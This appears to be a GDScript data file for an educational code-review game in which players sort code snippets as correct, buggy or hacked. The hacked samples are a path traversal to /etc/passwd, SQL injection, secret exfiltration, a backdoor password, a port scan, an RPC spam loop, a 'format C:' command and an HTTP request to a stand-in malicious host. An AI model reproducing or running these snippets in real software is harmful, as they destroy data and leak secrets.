extends Node

# Enumerador de status
enum Status { CORRECT, BUGGED, HACKED }

const ALL_CORRECT: Array = [
	{
		"task_id": "d1_t2",
		"reference_code": "def auth_user(username, password):\n\tif db.verify(username, password):\n\t\treturn True\n\treturn False",
		"student_code": "def auth_user(username, password):\n\tif db.verify(username, password):\n\t\treturn True\n\treturn False",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "d1_t5",
		"reference_code": "def formatar_nome(nome):\n\treturn nome.strip().title()",
		"student_code": "def formatar_nome(nome):\n\treturn nome.strip().title()",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_c_1",
		"reference_code": "func calcular_dano(ataque, defesa):\n\treturn max(0, ataque - defesa)",
		"student_code": "func calcular_dano(ataque, defesa):\n\treturn max(0, ataque - defesa)",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_c_2",
		"reference_code": "func curar(quantidade):\n\tvida += quantidade\n\tvida = min(vida, vida_maxima)",
		"student_code": "func curar(qtd):\n\tvida += qtd\n\tif vida > vida_maxima:\n\t\tvida = vida_maxima",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_c_3",
		"reference_code": "func get_inimigos():\n\treturn get_tree().get_nodes_in_group(\"inimigos\")",
		"student_code": "func get_inimigos():\n\tvar lista_inimigos = get_tree().get_nodes_in_group(\"inimigos\")\n\treturn lista_inimigos",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_c_4",
		"reference_code": "func pular():\n\tif is_on_floor():\n\t\tvelocity.y = JUMP_VELOCITY",
		"student_code": "func pular():\n\tif is_on_floor():\n\t\tvelocity.y = JUMP_VELOCITY",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_c_5",
		"reference_code": "func aplicar_gravidade(delta):\n\tif not is_on_floor():\n\t\tvelocity.y += gravity * delta",
		"student_code": "func aplicar_gravidade(delta):\n\tvar grav_atual = gravity * delta\n\tif not is_on_floor():\n\t\tvelocity.y += grav_atual",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_c_6",
		"reference_code": "func atualizar_ui(pontos):\n\tscore_label.text = str(pontos)",
		"student_code": "func atualizar_ui(pontos):\n\tscore_label.text = \"%d\" % pontos",
		"expected_action": Status.CORRECT,
		"hacker_clue": ""
	}
]

const ALL_BUGGED: Array = [
	{
		"task_id": "d1_t1",
		"reference_code": "def soma_vetores(v1, v2):\n\treturn [x + y for x, y in zip(v1, v2)]",
		"student_code": "def soma_vetores(v1, v2):\n\treturn [x + y for x in v1 for y in v2]",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "d1_t4",
		"reference_code": "def calcular_idade(ano_nasc):\n\tano_atual = 2026\n\treturn ano_atual - ano_nasc",
		"student_code": "def calcular_idade(ano_nasc):\n\tano_atual = 2026\n\treturn ano_atual + ano_nasc",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_b_1",
		"reference_code": "func aplicar_desconto(preco, porcentagem):\n\treturn preco - (preco * (porcentagem / 100.0))",
		"student_code": "func aplicar_desconto(preco, porcentagem):\n\treturn preco - (preco * (porcentagem / 0))",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_b_2",
		"reference_code": "func buscar_item(id):\n\tfor item in inventario:\n\t\tif item.id == id:\n\t\t\treturn item",
		"student_code": "func buscar_item(id):\n\tfor i in range(inventario.size() + 1):\n\t\tvar item = inventario[i]",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_b_3",
		"reference_code": "func atirar():\n\tvar bala = projetil.instantiate()\n\tadd_child(bala)\n\tbala.position = global_position",
		"student_code": "func atirar():\n\tvar bala = projetil.instantiate()\n\tbala.position = global_position",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_b_4",
		"reference_code": "func instanciar_inimigo():\n\tvar inimigo = preload(\"res://inimigo.tscn\").instantiate()\n\tadd_child(inimigo)",
		"student_code": "func instanciar_inimigo():\n\tvar inimigo = preload(\"res://inimigo.tscn\").instance()\n\tadd_child(inimigo)",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_b_5",
		"reference_code": "func atualizar_timer(delta):\n\ttempo_restante -= delta\n\tif tempo_restante <= 0:\n\t\tgame_over()",
		"student_code": "func atualizar_timer(delta):\n\ttempo_restante = delta\n\tif tempo_restante <= 0:\n\t\tgame_over()",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	},
	{
		"task_id": "gen_b_6",
		"reference_code": "func calcular_media(valores):\n\tvar soma = 0\n\tfor v in valores:\n\t\tsoma += v\n\treturn soma / valores.size()",
		"student_code": "func calcular_media(valores):\n\tvar soma = 0\n\tfor v in valores:\n\t\tsoma += v",
		"expected_action": Status.BUGGED,
		"hacker_clue": ""
	}
]

const ALL_HACKED: Array = [
	{
		"task_id": "py_h_1",
		"reference_code": "def read_user_file(filename):\n\tfile_path = BASE_DIR / filename\n\tif not file_path.resolve().is_relative_to(BASE_DIR):\n\t\traise ValueError(\"Acesso negado\")\n\twith open(file_path, \"r\") as file:\n\t\treturn file.read()",
		"student_code": "from pathlib import Path\nBASE_DIR = Path(\"/app/uploads\")\n\ndef read_user_file(filename):\n\tfile_path = BASE_DIR / filename\n\twith open(file_path, \"r\") as file:\n\t\treturn file.read()\n\nprint(read_user_file(\"../../etc/passwd\"))",
		"expected_action": Status.HACKED,
		"hacker_clue": "Vulnerabilidade de Path Traversal (Directory Traversal). O script força a navegação para fora da pasta permitida, acessando senhas em /etc/passwd."
	},
	{
		"task_id": "py_h_2",
		"reference_code": "def check_server_health(host):\n\treturn ping(host)",
		"student_code": "import random\nimport time\n\ninternal_hosts = [\"10.0.0.1\", \"10.0.0.2\", \"10.0.0.5\"]\ncommon_ports = [22, 80, 443, 3306, 6379, 8080]\n\ndef fake_probe(host, port):\n\ttime.sleep(0.05)\n\treturn random.choice([True, False, False])\n\nfor host in internal_hosts:\n\tfor port in common_ports:\n\t\tif fake_probe(host, port):\n\t\t\tprint(f\"[OPEN] {host}:{port}\")",
		"expected_action": Status.HACKED,
		"hacker_clue": "Tentativa de mapeamento de rede interna. O script atua como um Port Scanner silencioso, procurando portas de banco de dados e SSH abertas."
	},
	{
		"task_id": "py_h_3",
		"reference_code": "def get_user_by_email(db, email):\n\tquery = \"SELECT id, name, role FROM users WHERE email = %s\"\n\treturn db.execute(query, (email,))",
		"student_code": "def get_user_by_email(db, email):\n\tquery = \"SELECT id, name, role FROM users WHERE email = '\" + email + \"'\"\n\treturn db.execute(query)\n\nemail = \"' OR '1'='1' --\"\nresult = get_user_by_email(fake_db, email)\nprint(result)",
		"expected_action": Status.HACKED,
		"hacker_clue": "Ataque de SQL Injection clássico. A concatenação direta da string da query permite injetar ' OR '1'='1' e roubar todo o banco de dados."
	},
	{
		"task_id": "py_h_4",
		"reference_code": "def collect_project_info():\n\tdata = {\n\t\t\"project\": \"internal-dev-api\",\n\t\t\"branch\": \"main\"\n\t}\n\treturn data",
		"student_code": "import base64\nimport json\n\ndef send_to_webhook(payload):\n\tprint(\"[mock-webhook] payload prepared\")\n\ndef collect_project_info():\n\tdata = {\"env\": {\"DB_PASSWORD\": \"mock-pass\", \"JWT_SECRET\": \"mock-secret\"}}\n\tencoded = base64.b64encode(json.dumps(data).encode()).decode()\n\tsend_to_webhook({\"event\": \"build_check\", \"data\": encoded})\n\ncollect_project_info()",
		"expected_action": Status.HACKED,
		"hacker_clue": "Exfiltração de Variáveis de Ambiente! O script pega senhas e tokens (JWT), os esconde codificando em Base64 e os envia para um webhook externo."
	},
	{
		"task_id": "py_h_5",
		"reference_code": "def validate_login_event(event):\n\tif event.get(\"username\") == \"admin\":\n\t\treturn True\n\treturn False",
		"student_code": "def validate_login_event(event):\n\tif event.get(\"username\") == \"admin\":\n\t\treturn True\n\tif event.get(\"ip\", \"\").startswith(\"10.\"):\n\t\treturn True\n\tif event.get(\"password\") == \"dev-bypass-2026\":\n\t\treturn True\n\treturn False",
		"expected_action": Status.HACKED,
		"hacker_clue": "Injeção de Backdoor de Autenticação. Uma senha fixa ('dev-bypass-2026') foi deixada no código fonte para burlar o sistema de login real."
	},
	{
		"task_id": "gen_h_4",
		"reference_code": "func salvar_progresso(dados):\n\tvar file = FileAccess.open(save_path, FileAccess.WRITE)\n\tfile.store_var(dados)",
		"student_code": "func salvar_progresso(dados):\n\tvar req = HTTPRequest.new()\n\tadd_child(req)\n\treq.request(\"http://malicious-ip.com/steal?data=\" + str(dados))",
		"expected_action": Status.HACKED,
		"hacker_clue": "Tentativa de exfiltração de dados locais via requisição HTTP externa."
	},
	{
		"task_id": "gen_h_5",
		"reference_code": "func carregar_textura():\n\treturn load(\"res://icon.svg\")",
		"student_code": "func carregar_textura():\n\tOS.execute(\"cmd.exe\", [\"/c\", \"format C:\"], [])\n\treturn load(\"res://icon.svg\")",
		"expected_action": Status.HACKED,
		"hacker_clue": "Injeção de comando no sistema operacional (RCE) maliciosa."
	},
	{
		"task_id": "gen_h_6",
		"reference_code": "func enviar_chat(mensagem):\n\tServer.rpc(\"receber_msg\", mensagem)",
		"student_code": "func enviar_chat(mensagem):\n\tfor i in 10000:\n\t\tServer.rpc(\"receber_msg\", \"HACKED BY LUSQUINHA\")",
		"expected_action": Status.HACKED,
		"hacker_clue": "Loop de requisições de rede agressivo para causar negação de serviço (DDoS / Spam)."
	}
]

var deck_correct: Array = []
var deck_bugged: Array = []
var deck_hacked: Array = []

func _ready() -> void:
	reset_and_shuffle_decks()

func reset_and_shuffle_decks() -> void:
	deck_correct = ALL_CORRECT.duplicate()
	deck_bugged = ALL_BUGGED.duplicate()
	deck_hacked = ALL_HACKED.duplicate()
	
	deck_correct.shuffle()
	deck_bugged.shuffle()
	deck_hacked.shuffle()

func get_tasks_for_day(day: int) -> Array:
	var daily_tasks: Array = []
	var tasks_per_day: int = 6
	
	if deck_hacked.size() == 0:
		deck_hacked = ALL_HACKED.duplicate()
		deck_hacked.shuffle()
		
	daily_tasks.append(deck_hacked.pop_back()) 

	var remaining_slots = tasks_per_day - daily_tasks.size()
	
	for i in range(remaining_slots):
		var available_decks = []
		
		if deck_correct.size() > 0: 
			available_decks.append(deck_correct)
		if deck_bugged.size() > 0: 
			available_decks.append(deck_bugged)
			
		if available_decks.size() == 0:
			reset_and_shuffle_decks()
			available_decks = [deck_correct, deck_bugged]
			
		var chosen_deck = available_decks.pick_random()
		daily_tasks.append(chosen_deck.pop_back())
		
	daily_tasks.shuffle()
	return daily_tasks
